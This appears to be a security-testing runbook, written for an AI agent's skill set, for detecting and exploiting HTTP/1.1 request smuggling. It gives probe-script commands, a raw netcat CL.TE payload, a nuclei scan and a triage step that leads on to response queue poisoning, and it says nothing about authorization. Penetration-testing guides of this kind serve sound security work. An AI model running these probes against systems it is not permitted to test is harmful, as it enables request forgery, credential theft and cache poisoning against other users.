# HTTP/1.1 Request Smuggling Runbook

## Purpose
Detect and exploit HTTP/1.1 request smuggling where frontend and backend proxies disagree on request boundaries (Content-Length vs Transfer-Encoding).

## Prerequisites
- Target is behind a reverse proxy/load balancer/CDN
- Python 3.9+ with `requests` library installed
- `nc` (netcat) available for raw socket tests
- `nuclei` for template-based confirmation

## Variables
| Variable | Description |
|----------|-------------|
| `TARGET` | Target hostname/URL (e.g. target.com or https://target.com) |
| `OUTDIR` | Output directory (from context) |

## Commands

### 1. CL.TE Test (Content-Length frontend, Transfer-Encoding backend)
```bash
python3 .claude/skills/http-protocol/scripts/http_smuggling_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --mode cl-te \
  --output $OUTDIR/http-protocol/smuggling/clte_findings.jsonl
```

### 2. TE.CL Test (Transfer-Encoding frontend, Content-Length backend)
```bash
python3 .claude/skills/http-protocol/scripts/http_smuggling_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --mode te-cl \
  --output $OUTDIR/http-protocol/smuggling/tecl_findings.jsonl
```

### 3. TE.TE Obfuscation Test
```bash
python3 .claude/skills/http-protocol/scripts/http_smuggling_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --mode te-te \
  --headers-file .claude/skills/http-protocol/payloads/smuggling-headers.txt \
  --output $OUTDIR/http-protocol/smuggling/tete_findings.jsonl
```

### 4. All Modes Combined
```bash
python3 .claude/skills/http-protocol/scripts/http_smuggling_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --mode all \
  --output $OUTDIR/http-protocol/smuggling/all_findings.jsonl
```

### 5. Manual Confirmation with netcat
```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | \
  nc -w 5 TARGET 80
```

### 6. Nuclei Template Confirmation
```bash
nuclei -u https://TARGET -t http/miscellaneous/request-smuggling/ -severity high,critical -o $OUTDIR/http-protocol/smuggling/nuclei_confirm.txt
```

## Expected Output

### Successful CL.TE finding format:
```json
{
  "smuggling_type": "CL.TE",
  "frontend_parser": "Content-Length",
  "backend_parser": "Transfer-Encoding",
  "success": true,
  "evidence": "HTTP/1.1 404 Not Found\r\n..."
}
```

### Successful TE.CL finding format:
```json
{
  "smuggling_type": "TE.CL",
  "frontend_parser": "Transfer-Encoding",
  "backend_parser": "Content-Length",
  "success": true,
  "evidence": "...smuggled_TESTNONCE detected in response..."
}
```

## Triage Guide

| Result | Action |
|--------|--------|
| `success: true` with valid evidence | Confirmed smuggling — proceed to response queue poisoning |
| `success: false` with `error: timeout` | Server hung — possible smuggling, retry with lower rate |
| `success: false` with `error: connection_refused` | Target not reachable — verify host and port |
| All TE.TE obfuscations rejected (400/501) | Server correctly handles TE obfuscation — no TE.TE |
| Both CL.TE and TE.CL fail | Try HTTP/2 downgrade smuggling (next workflow) |

## Severity: Critical (CVSS 9.0+)
Request smuggling enables full request forgery, credential theft, and cache poisoning for all users behind the proxy.